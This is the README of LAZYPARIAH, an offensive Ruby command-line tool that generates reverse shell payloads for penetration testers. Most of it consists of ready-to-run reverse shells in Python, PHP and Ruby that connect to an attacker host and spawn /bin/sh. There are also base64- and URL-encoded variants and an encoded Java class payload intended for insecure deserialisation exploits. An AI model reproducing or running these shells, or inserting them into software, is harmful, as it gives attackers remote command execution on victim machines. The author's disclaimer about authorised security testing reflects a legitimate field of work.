# LAZYPARIAH
A tool for generating reverse shell payloads on the fly.

## Description
LAZYPARIAH is a simple command-line tool for generating a range of reverse shell payloads on the fly. It was written in pure Ruby and has no dependencies outside of the standard library.

This tool is intended to be used only in authorised circumstances by qualified penetration testers, security researchers and red team professionals. Before downloading, installing or using this tool, please ensure that you understand the relevant laws in your jurisdiction. The author of this tool does not endorse the usage of this tool for illegal or unauthorised purposes.

## Demonstration
![Alt text](./lazypariah.svg)

## Dependencies
* Ruby >= 2.7.1 (LAZYPARIAH has not been tested on previous versions of Ruby)
* OpenJDK (Optional: Only required for `java_class` payloads.)
* GCC (Optional: Only required for `c_binary` payloads.)

## Installation
LAZYPARIAH can be installed as follows:
```
gem install lazypariah
```

## Usage
```
Usage:  lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
Note:   <ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.

Example:        lazypariah -u python3_b64 10.10.14.4 1555
Example:        lazypariah python2_c malicious.local 1337

Valid Payloads:
    awk
    bash_tcp
    c_binary
    c_binary_b64
    c_binary_gzip
    c_binary_gzip_b64
    java_class_b64
    java_class_binary
    java_class_gzip_b64
    nc
    nc_pipe
    perl
    perl_c
    php_fd_3
    php_fd_3_c
    php_fd_3_tags
    php_fd_4
    php_fd_4_c
    php_fd_4_tags
    php_fd_5
    php_fd_5_c
    php_fd_5_tags
    php_fd_6
    php_fd_6_c
    php_fd_6_tags
    python
    python2_b64
    python2_c
    python3_b64
    python3_c
    python_b64
    python_c
    ruby
    ruby_b64
    ruby_c
    socat

Valid Options:
    -h, --help                       Display help text and exit.
    -l, --license                    Display license information and exit.
    -u, --url                        URL-encode the payload.
    -v, --version                    Display version information and exit.
```

## Further Notes and Examples
The payloads listed above are more-or-less systematically named.

Payloads ending with `_c` are intended to be executed from within a shell session. These payloads execute code directly using the relevant interpreter (e.g. `python3 -c` or `ruby -e`).

For example, the command `lazypariah python3_c 10.10.14.4 1337` should produce the following output:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The command `lazypariah python 10.10.14.4 1337`, on the other hand, should simply produce a block of Python code which could potentially be placed in a `.py` file:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Generally speaking, selecting payloads ending with `_b64` should produce a command intended to be run from within a shell session in a similar manner to payloads ending with `_c`, but the commands will be different in structure. These commands will essentially pipe a base64-encoded block of code through to `base64 -d` and then on through to the relevant interpreter (such as `python3`, `python2` or `ruby`).

For example, the command `lazypariah python3_b64 10.10.14.4 1337` should produce the following output:
```
echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python3
```

The exception to this is compiled payloads, such as `c_binary_b64` and `java_class_gzip_b64`. Since C and Java are not interpreted languages, selecting these payloads will simply output base64-encoded data. If one selects the latter (`java_class_gzip_b64`), the resulting payload should be base64-encoded gzip-compressed Java class file containing the reverse shell payload. Such payloads may be useful for exploiting insecure deserialisation in a Java web app. For example, the command `lazypariah java_class_gzip_b64 10.10.14.4 1337` should produce the following payload:
```
H4sIAGBTu18AA3VTXVcSURTdgzNcoFEUMaU0M7XwC7QsE8xK08LwoyANzVoD3HQUGdfMUPZXfKi1fPG1XrCVq35AP6bVL8jOBUnJGu5sztl3n3vOmTnz/deXbwBG8MqDNvQw9DL0udDvgQMDAkICwgyDLgx54MJ1DzpxQ8CwcEvWTWGV4JYHXRgRcNuDbowKiCgoXxQaxZgIuMMwLv7viph7DPcZJiQ4x/S8bo9LqAn2LEqQJ40sl+CN63k+V9hKczOppXPE1CZsLbM5q22XfIZJhgcMUxI8UzsZvm3rRt4iJ2EUzAyf1kUIM63QhvZGU3EJ7RJahB3Oafm18IJpZLhlTRT0XJabEupPthK2qefXKDic1vNha10ET6t4iEcqYpih0kraPLfDCSOzyW1KOjQYEms4NCzUj1XEMatiTsA8FlQ8wVMVCSRVPBOwiCUVz9HOkFKxjBUVL5CU0HhSxJ+WVKyiXcVLUb/DtKoqnU9v8AylbzjTV+Us3QjH8tsFm3ri2pYEf4WdL9in6PPBlfjfDyAqXkajybO6SUmmTNMwK/K24HJP/H/PMipBsWzNpLqagv+QRUW6s9liIl3dGrer6m2unFDdSLQsrSrKS0R1Vy2ngk/vULRLtyZzhsWzpalbluAmnZ4rDxoxMZpDktK28tbUbSLlYKlC5XWuYK1XvYXk+rHSynG+LZQzQunmO7q9qOUKYg6z3LJN4x2JMiItOtBK3524JPrRcNLXdlk4cMJN7MfeA0iHcKTkr6hJ1fjkxAEUuQhnESx+CFfK525QRg/gme0r4twcgRqR+4uojShk10WcZHsjjLB+F6sDRTS8hzfAyPAV0bh/9DMgl7j6ABNWmfwRUI5Jp7AqJCvCH6DEfj+aPqOZzm9Z2ocr4to/2iPnAiW5+IlK38UH7CFAnXRA9CGVurtC2At2hGm4GFoZOpkwuiqrmxapfX7/EkNAxlXSyxQXoPsa2Q4EfwOw0NwVrQQAAA==
```

Some payloads use a specific file descriptor, such as `php_fd_5_tags`, which is a PHP payload that makes use of file descriptor 5 and is enclosed within PHP tags (`<?php` and `?>`).

Below are some examples of commands and their respective outputs.

Output of command `lazypariah -u python3_b64 10.10.14.4 1337`:
```
echo%20aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3
```
Output of command `lazypariah python2_c 10.10.14.4 1337`:
```
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Output of command `lazypariah php_fd_3_tags 10.10.14.4 1337`:
```
<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
```
Output of command `lazypariah ruby 10.10.14.4 1337`:
```
require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```
Below is an example of the `c_binary_gzip_b64` payload in action:
![Alt text](./c_binary_gzip_b64_demo.png)

## Author
Copyright (C) 2020 Peter Bruce Funnell

## License
This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.  If not, see <https://www.gnu.org/licenses/>

## Support
If you found this project useful and would like to encourage me to continue making open source software, please consider making a donation via the following link:

https://www.buymeacoffee.com/peterfunnell

Donations in Bitcoin (BTC) are also very welcome. My BTC wallet address is as follows:

```
3EdoXV1w8H7y7M9ZdpjRC7GPnX4aouy18g
```
